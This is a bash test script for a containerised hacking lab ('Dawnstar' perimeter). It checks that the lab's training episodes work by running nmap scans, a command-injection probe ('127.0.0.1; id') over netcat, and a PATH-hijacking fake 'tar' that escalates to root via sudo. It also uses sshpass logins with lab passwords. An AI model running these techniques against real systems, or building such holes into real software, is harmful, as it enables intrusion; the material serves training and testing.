#!/usr/bin/env bash
set -euo pipefail

project="dawnstar-test-perimeter"
episode_override="$(mktemp)"
compose=(docker compose -p "$project" -f compose.yaml -f "$episode_override")
started=0

cleanup() {
  if [[ "$started" -eq 1 ]]; then
    "${compose[@]}" down -v --remove-orphans
  fi
  rm -f "$episode_override"
}

wait_for_perimeter_ready() {
  local container_id status attempt
  container_id="$("${compose[@]}" ps -q perimeter)"

  for attempt in $(seq 1 30); do
    status="$(docker inspect --format '{{.State.Health.Status}}' "$container_id")"
    if [[ "$status" == "healthy" ]]; then
      return 0
    fi
    sleep 1
  done

  echo "perimeter did not become healthy within 30 seconds" >&2
  "${compose[@]}" logs perimeter >&2
  return 1
}

start_episode() {
  local episode="$1"

  if [[ "$started" -eq 1 ]]; then
    "${compose[@]}" down -v --remove-orphans
  fi

  printf 'services:\n  perimeter:\n    environment:\n      LAB_EPISODE: "%s"\n' \
    "$episode" >"$episode_override"
  started=1
  "${compose[@]}" up -d --build attacker perimeter
  wait_for_perimeter_ready
}

assert_auth_log_contains() {
  local pattern="$1" attempt

  for attempt in $(seq 1 20); do
    if "${compose[@]}" exec -T perimeter grep -q "$pattern" /var/log/auth.log; then
      return 0
    fi
    sleep 1
  done

  echo "auth.log did not contain expected pattern: $pattern" >&2
  "${compose[@]}" exec -T perimeter cat /var/log/auth.log >&2
  return 1
}

trap cleanup EXIT
start_episode 01
"${compose[@]}" exec -T attacker bash -o errexit -o pipefail -lc '
  nmap -Pn -p 21,22,80,4040 172.30.10.10 | grep "21/tcp.*open"
  nmap -Pn -p 21,22,80,4040 172.30.10.10 | grep "22/tcp.*open"
  nmap -Pn -p 21,22,80,4040 172.30.10.10 | grep "80/tcp.*open"
  nmap -Pn -p 4040 172.30.10.10 | grep "4040/tcp.*open"
  printf "PROBE 127.0.0.1; id\n" | nc -w 3 172.30.10.10 4040 | grep "uid=.*telemetry"
  curl -fsS http://172.30.10.10/ | grep "Dawnstar Applied Sciences"
  curl -fsS ftp://172.30.10.10/staff.txt | grep "nova"
  curl -fsS ftp://172.30.10.10/password-policy.txt | grep "Dawnstar"
'

"${compose[@]}" exec -T perimeter test ! -e /home/checkpoint
"${compose[@]}" exec -T perimeter passwd -S telemetry | grep '^telemetry L '

# Episode 04 checkpoint scaffolding resumes the telemetry foothold so the
# deliberate archive-telemetry PATH lesson can be exercised independently.
start_episode 04
"${compose[@]}" exec -T perimeter test ! -e /home/checkpoint
"${compose[@]}" exec -T attacker bash -o errexit -o pipefail -lc '
  ssh_options=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR)
  sshpass -p "Telemetry-Resume!" ssh "${ssh_options[@]}" telemetry@172.30.10.10 '\''
    mkdir -p /home/telemetry/bin
    printf "#!/bin/sh\\nexec id\\n" > /home/telemetry/bin/tar
    chmod 0755 /home/telemetry/bin/tar
    sudo /usr/local/sbin/archive-telemetry
  '\''
' | grep 'uid=0(root)'
"${compose[@]}" exec -T perimeter test -f /var/log/auth.log
"${compose[@]}" exec -T perimeter test -f /root/.bash_history
"${compose[@]}" exec -T perimeter sh -c '
  set -eu
  test "$(stat -c %a /root/operations-access.conf)" = 600
  test "$(grep -c "^" /root/operations-access.conf)" = 3
  grep -Fx "host=172.30.20.20" /root/operations-access.conf
  grep -Fx "user=relay" /root/operations-access.conf
  grep -Fx "password=OrbitRelay!" /root/operations-access.conf
'
if "${compose[@]}" exec -T -u telemetry perimeter cat /root/operations-access.conf; then
  echo "operations credential must be root-only" >&2
  exit 1
fi
assert_auth_log_contains 'Accepted password for telemetry'

# Episode 05 checkpoint is resume-only scaffolding, separate from the labeled
# persistence artifact introduced in Episode 06.
start_episode 05
"${compose[@]}" exec -T perimeter passwd -S telemetry | grep '^telemetry L '
"${compose[@]}" exec -T perimeter test ! -e /root/.ssh/authorized_keys
"${compose[@]}" exec -T attacker bash -o errexit -o pipefail -lc '
  ssh_options=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR)
  sshpass -p "Dawnstar-Resume-Only!" ssh "${ssh_options[@]}" checkpoint@172.30.10.10 \
    "sudo -n id"
' | grep 'uid=0(root)'
assert_auth_log_contains 'Accepted password for checkpoint'

start_episode 06
"${compose[@]}" exec -T perimeter id checkpoint
"${compose[@]}" exec -T perimeter grep -q 'PERSISTENCE-DEMO' /root/.ssh/authorized_keys
"${compose[@]}" exec -T perimeter sh -c \
  'test "$(stat -c %a /root/.ssh/authorized_keys)" = 600'
"${compose[@]}" exec -T perimeter touch /root/reset-marker
"${compose[@]}" up -d --force-recreate perimeter
wait_for_perimeter_ready
"${compose[@]}" exec -T perimeter test ! -e /root/reset-marker
